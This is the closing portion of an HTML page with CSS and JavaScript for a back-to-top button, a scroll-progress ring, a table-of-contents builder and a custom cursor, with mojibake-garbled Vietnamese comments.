    filter:blur(6px) saturate(1.4);
    transition:transform 1.5s linear, filter .5s;
  }
  #backTop:hover{
    box-shadow: 0 0 18px rgba(0,255,170,.65),
                0 0 36px rgba(0,140,255,.55),
                inset 0 0 14px rgba(0,255,170,.12);
    filter:brightness(1.06) contrast(1.08) saturate(1.12);
    animation:shake .45s cubic-bezier(.36,.07,.19,.97) both, floatCard 3s ease-in-out infinite .45s;
  }
  #backTop:hover::before{ transform: rotate(360deg); filter: hue-rotate(360deg) blur(6px) saturate(1.4); }
  #backTop .arrow{
    position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
    font-size:26px; color:#fff; text-shadow:0 0 8px rgba(0,255,170,.9),0 0 16px rgba(0,140,255,.7);
    pointer-events:none;
  }

  /* ===== Mini progress ring (only one we keep) ===== */
  #scrollProgressMini{
    position: fixed;
    right: 22px; bottom: 150px; /* t·∫°m; JS s·∫Ω ƒë·∫∑t l·∫°i theo #backTop */
    width: 52px; height: 52px;
    display: none; align-items: center; justify-content: center;
    border-radius: 50%; background: #0b0b0b;
    box-shadow: 0 0 8px rgba(0,255,170,.4), 0 0 16px rgba(0,140,255,.3);
    z-index: 9999;
  }
  #scrollProgressMini .ring{ position:absolute; inset:4px; transform: rotate(-90deg); }
  #scrollProgressMini .ring-bg{ fill:none; stroke:rgba(255,255,255,.18); stroke-width:4; }
  #scrollProgressMini .ring-fg{
    fill:none; stroke:#a3ff12; stroke-width:4; stroke-linecap:round;
    stroke-dasharray:1 120; stroke-dashoffset:0;
    filter:drop-shadow(0 0 4px rgba(163,255,18,.7));
  }
  #scrollProgressMini .percent{
    position:relative; font-size:.72rem; font-weight:800; color:#a3ff12; text-shadow:0 0 4px rgba(163,255,18,.6);
  }
  @media (max-width:480px){
    #scrollProgressMini{ width:46px; height:46px; }
    #scrollProgressMini .percent{ font-size:.68rem; }
    #scrollProgressMini .ring{ inset:3px; }
  }

  /* Animations */
  @keyframes floatCard{ 0%,100%{transform:translateY(0)} 50%{transform:translateY(-6px)} }
  @keyframes shake{ 10%,90%{transform:translate3d(-1px,0,0)} 20%,80%{transform:translate3d(2px,0,0)} 30%,50%,70%{transform:translate3d(-3px,0,0)} 40%,60%{transform:translate3d(3px,0,0)} }
</style><style>.page-header .project-name, .page-header .project-tagline{ display:none; }</style><!-- Back-to-Top card (no progress inside) -->
<button id="backTop" type="button" title="Back to top" aria-label="Back to top">
  <span class="arrow">‚ñ≤</span>
</button>

<!-- Mini progress ring above the card -->
<div id="scrollProgressMini" aria-hidden="true" title="Scroll progress">
  <svg class="ring" viewBox="0 0 44 44" width="44" height="44">
    <circle class="ring-bg" cx="22" cy="22" r="19.5"></circle>
    <circle class="ring-fg" cx="22" cy="22" r="19.5"></circle>
  </svg>
  <span class="percent">0%</span>
</div>

<script>
  /* Dedupe: remove duplicated includes if any */
  (function(){['#backTop','#scrollProgressMini'].forEach(sel=>{
    const nodes=document.querySelectorAll(sel); if(nodes.length>1) nodes.forEach((el,i)=>{ if(i>0) el.remove(); });
  });})();

  // Build TOC (unchanged)
  (function () {
    const toc = document.getElementById("toc"); if (!toc) return;
    const heads = [...document.querySelectorAll("main h2, main h3")];
    if (!heads.length) { toc.remove(); return; }
    heads.forEach(h => { if (!h.id) h.id = h.textContent.trim().toLowerCase().replace(/[^\w\- ]+/g,"").replace(/\s+/g,"-"); });
    const ul = document.createElement("ul");
    heads.forEach(h => { const li=document.createElement("li"); li.setAttribute("data-level", h.tagName==="H3"?"3":"2"); const a=document.createElement("a"); a.href="#"+h.id; a.textContent=h.textContent; li.appendChild(a); ul.appendChild(li); });
    toc.querySelector(".toc-body").appendChild(ul);
    const key="toc-state:"+location.pathname, preferOpen=matchMedia("(min-width:900px)").matches, saved=localStorage.getItem(key), startOpen=saved? saved==="open" : preferOpen;
    setExpanded(startOpen);
    function setExpanded(open){ toc.classList.toggle("collapsed", !open); toc.setAttribute("aria-expanded", String(open)); toc.querySelector(".toc-head").setAttribute("aria-expanded", String(open)); }
    function toggle(){ const open=toc.classList.contains("collapsed"); setExpanded(open); localStorage.setItem(key, open ? "open" : "closed"); }
    const head=toc.querySelector(".toc-head"); head.addEventListener("click", toggle);
    head.addEventListener("keydown", e => { if (e.key==="Enter"||e.key===" "){ e.preventDefault(); toggle(); }});
  })();

  // Back-to-Top + Mini progress ring (only mini shows progress)
  (function () {
    const btn  = document.getElementById("backTop");
    const mini = document.getElementById("scrollProgressMini");
    const miniTxt  = mini?.querySelector(".percent");
    const miniRing = mini?.querySelector(".ring-fg");
    if (!btn || !mini || !miniTxt || !miniRing) return;

    // prepare ring
    const r = parseFloat(miniRing.getAttribute("r") || "19.5");
    const C = 2 * Math.PI * r;
    miniRing.style.strokeDasharray = `${C} ${C}`;
    miniRing.style.strokeDashoffset = `${C}`;

    function setProgress(p){
      miniRing.style.strokeDashoffset = String(C - (p/100)*C);
      miniTxt.textContent = p + "%";
    }

    // place mini just above the card
    function placeMini(){
      const gap = 24;
      const rect = btn.getBoundingClientRect();
      mini.style.right  = (window.innerWidth  - rect.right) + "px";
      mini.style.bottom = (window.innerHeight - rect.top + gap) + "px";
    }

    function update(){
      const doc = document.documentElement;
      const max = doc.scrollHeight - doc.clientHeight;
      const sc  = max > 0 ? Math.round((doc.scrollTop / max) * 100) : 0;
      setProgress(sc);
      const show = sc > 3;
      btn.style.display  = show ? "block" : "none";
      mini.style.display = show ? "flex"  : "none";
      if (show) placeMini();
    }

    window.addEventListener("scroll", update, { passive:true });
    window.addEventListener("resize", () => { if (mini.style.display !== "none") placeMini(); });
    update();

    btn.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));
  })();
</script>


    </main>

    <!-- Cursor CSS + JS (anti-flicker) -->
    <style>
  :root{
    --cursor-normal: url('/assets/images/cursor-normal-32.png') 4 4, auto;
    --cursor-hover:  url('/assets/images/cursor-hover-32.png') 4 4, auto;
  }

  /* M·∫∑c ƒë·ªãnh: ph·ªß custom cursor to√†n trang (∆∞u ti√™n cao) */
  html, body, * {
    cursor: var(--cursor-normal) !important;
  }

  /* T·∫•t c·∫£ tr·∫°ng th√°i c·ªßa link & v√πng clickable -> d√πng hover cursor */
  a, a *,
  a:link, a:link *,
  a:visited, a:visited *,
  a:hover, a:hover *,
  a:focus, a:focus *,
  a:active, a:active *,
  a:focus-visible, a:focus-visible *,
  button, button *,
  [role="button"], [role="button"] *,
  [onclick], [onclick] *,
  input[type="button"], input[type="submit"],
  label[for], summary {
    cursor: var(--cursor-hover) !important;
  }

  /* Khi ƒëang gi·ªØ chu·ªôt / ƒëang ƒëi·ªÅu h∆∞·ªõng: √©p to√†n trang sang hover-cursor */
  html.is-mousedown *, html.is-mousedown *::before, html.is-mousedown *::after,
  html.is-mousedown svg, html.is-mousedown svg *,
  html.is-navigating *, html.is-navigating *::before, html.is-navigating *::after,
  html.is-navigating svg, html.is-navigating svg *{
    cursor: var(--cursor-hover) !important;
  }

  /* V√πng nh·∫≠p li·ªáu gi·ªØ I-beam (k·ªÉ c·∫£ khi mousedown/navigating) */
  input, textarea, [contenteditable="true"]{
    cursor: text !important;
  }
  html.is-mousedown input,
  html.is-mousedown textarea,
  html.is-mousedown [contenteditable="true"],
  html.is-navigating input,
  html.is-navigating textarea,
  html.is-navigating [contenteditable="true"]{
    cursor: text !important;
  }

  /* Retina 2x: d√πng ·∫£nh 48px, hotspot 6,6 (s·∫Øc n√©t) */
  @media (min-resolution: 2dppx), (-webkit-min-device-pixel-ratio: 2){
    :root{
      --cursor-normal: url('/assets/images/cursor-normal-48.png') 6 6, auto;
      --cursor-hover:  url('/assets/images/cursor-hover-48.png') 6 6, auto;
    }
  }

  /* Thi·∫øt b·ªã c·∫£m ·ª©ng: tr·∫£ v·ªÅ m·∫∑c ƒë·ªãnh */
  @media (pointer: coarse){
    html, body, *, *::before, *::after{
      cursor: auto !important;
    }
  }
</style>

<script>
  (function () {
    const root = document.documentElement;

    const addDown = () => root.classList.add('is-mousedown');
    const rmDown  = () => root.classList.remove('is-mousedown');
    const addNav  = () => root.classList.add('is-navigating');
    const rmNav   = () => root.classList.remove('is-navigating');

    /* D√πng capture ƒë·ªÉ ch·∫°y TR∆Ø·ªöC khi UA √°p :active */
    window.addEventListener('mousedown', addDown,   { passive: true, capture: true });
    window.addEventListener('pointerdown', addDown, { passive: true, capture: true });

    window.addEventListener('mouseup', rmDown,       { passive: true });
    window.addEventListener('pointerup', rmDown,     { passive: true });
    window.addEventListener('pointercancel', rmDown, { passive: true });
    window.addEventListener('dragend', rmDown,       { passive: true });

    /* Click link -> b·∫≠t c·ªù ƒëi·ªÅu h∆∞·ªõng ngay.
       N·∫øu l√† SPA/preventDefault, g·ª° c·ªù sau 200ms ƒë·ªÉ tr√°nh k·∫πt tr·∫°ng th√°i. */
    document.addEventListener('click', (e) => {
      const isLeft = (e.button === 0);
      const el = e.target.closest('a, [data-href]');
      if (!el || !isLeft) return;

      if ((el.tagName === 'A' && el.href) || el.hasAttribute('data-href')) {
        addNav();
        setTimeout(rmNav, 200);
      }
    }, { passive: true, capture: true });

    /* Khi s·∫Øp r·ªùi trang th·ª±c s·ª± */
    window.addEventListener('beforeunload', addNav, { once: true });
    window.addEventListener('pagehide',     addNav, { once: true });

    /* Quay l·∫°i t·ª´ bfcache: d·ªçn l·∫°i c·ªù */
    window.addEventListener('pageshow', () => { rmDown(); rmNav(); }, { passive: true });
  })();
</script>

  </body>
</html>
